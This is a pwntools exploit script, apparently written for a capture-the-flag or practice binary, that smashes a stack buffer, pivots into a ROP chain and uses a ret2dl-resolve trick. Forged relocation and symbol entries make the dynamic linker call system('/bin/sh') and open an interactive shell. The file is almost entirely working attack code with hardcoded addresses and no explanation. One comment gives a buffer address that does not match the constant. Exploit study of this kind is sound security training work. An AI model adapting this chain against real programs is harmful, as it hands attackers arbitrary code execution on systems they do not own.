from pwn import *

g_local = True

ROP_SIZE = 20

LEAVE_RETN = 0x0804851D
BUFFER = 0x804AE50
NEXT_ROP = BUFFER - ROP_SIZE
READ_ADDR = 0x080483A0
STRLEN_GOT = 0x804A014

FAKE_SYM_ADDR = BUFFER + 8
SYMTAB_ADDR = 0x080481D8
SIZEOF_SYM = 0x10
FAKE_SYMTAB_IDX = (((FAKE_SYM_ADDR-SYMTAB_ADDR)/SIZEOF_SYM) << 8) + 7

STRTAB_ADDR = 0x08048278
SYSTEM_ADDR = BUFFER + 0x18
BIN_SH_ADDR = SYSTEM_ADDR + 7
FAKE_STR_OFF = SYSTEM_ADDR-STRTAB_ADDR

REL_ADDR = 0x8048330
FAKE_REL = BUFFER
FAKE_REL_OFF = FAKE_REL - REL_ADDR

DYN_RESOL_PLT = 0x08048380

#context.log_level='debug'
if g_local:
	sh = process('./32.out')#env={'LD_PRELOAD':'./libc.so.6'}
	gdb.attach(sh)
else:
	sh = None


payload1 = "A" * 108
payload1 += p32(NEXT_ROP)
payload1 += p32(READ_ADDR)
payload1 += p32(LEAVE_RETN)
payload1 += p32(0)
payload1 += p32(BUFFER - ROP_SIZE)
payload1 += p32(0x100)
payload1 += "P" * (0x100 - len(payload1))
sh.send(payload1)


#at BUFFER = 0x804A050

fake_Elf32_Rel = p32(STRLEN_GOT)
fake_Elf32_Rel += p32(FAKE_SYMTAB_IDX)


fake_Elf32_Sym = p32(FAKE_STR_OFF)
fake_Elf32_Sym += p32(0)
fake_Elf32_Sym += p32(0)
fake_Elf32_Sym += chr(0x12) + chr(0) + p16(0)

strings = "system\x00/bin/sh\x00\x00"

rop = p32(0)
rop += p32(DYN_RESOL_PLT)
rop += p32(FAKE_REL_OFF)
rop += "AAAA"
rop += p32(BIN_SH_ADDR)

payload2 = rop + fake_Elf32_Rel + fake_Elf32_Sym + strings

sh.send(payload2)

sh.interactive()